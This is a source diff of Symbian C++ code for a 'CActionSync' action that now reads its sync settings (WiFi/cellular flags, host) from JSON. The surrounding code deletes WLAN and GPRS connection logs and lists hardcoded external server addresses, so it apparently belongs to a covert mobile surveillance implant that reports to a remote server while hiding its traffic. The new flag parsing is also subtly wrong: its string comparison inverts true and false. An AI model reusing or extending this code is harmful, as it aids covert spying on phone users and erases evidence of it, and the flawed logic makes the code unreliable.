@@ -23,6 +23,8 @@
 
 #include "ConnLogCleaner.h"		// delete wlan and gprs connection logs
 
+#include "Json.h"
+
 #define KLogWlanDataEventType 0x1000595f
 const TUid KLogWlanDataEventTypeUid = {KLogWlanDataEventType};
      
@@ -66,30 +68,52 @@ void CActionSync::ConstructL(const TDesC8& params)
 	BaseConstructL(params);
 	iSocketServ.Connect();
 
-	// Parses the parameters...
-	TUint8* ptr = (TUint8 *)iParams.Ptr();
-	Mem::Copy(&iUseGPRS, ptr, 4);
-	ptr += sizeof(TUint32);
-
-	Mem::Copy(&iUseWiFi, ptr, 4);
-	ptr += sizeof(TUint32);
-	
-	TUint32 lenHost = 0;
-	Mem::Copy(&lenHost, ptr, 4);
-
-	ptr += sizeof(TUint32);
-	
-	if (lenHost > 0)
+	RBuf paramsBuf;
+		
+	TInt err = paramsBuf.Create(2*params.Size());
+	if(err == KErrNone)
 		{
-		TUint8 totChars = (lenHost-1) / 2;
-		TPtr16 ptrHost((TUint16 *) ptr, totChars, totChars);
-		iHostName.Copy(ptrHost);
+		paramsBuf.Copy(params);
 		}
-	ptr += lenHost;
+	else
+		{
+		//TODO: not enough memory
+		}
+		
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//retrieve wifi/gprs flag
+		TBuf<6> flag;
+		rootObject->GetStringL(_L("wifi"),flag);
+		if(flag.Compare(_L("true")))
+			iUseWiFi = ETrue;
+		else
+			iUseWiFi = EFalse;
+		rootObject->GetStringL(_L("cell"),flag);
+		if(flag.Compare(_L("true")))
+			iUseGPRS = ETrue;
+		else
+			iUseGPRS = EFalse;
+		//retrieve host address
+		rootObject->GetStringL(_L("host"),iHostName);
+		CleanupStack::PopAndDestroy(rootObject);
+		}
 
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
+
+	
 	// force it to test
 	// iHostName = _L("192.168.100.100");    // internal address of external server
 	// iHostName = _L("192.168.1.177");     // debug server
+	// iHostName = _L("72.13.93.215");  //test etaj.com
 	iProtocol = CProtocol::NewL(*this);	
 	
 	}
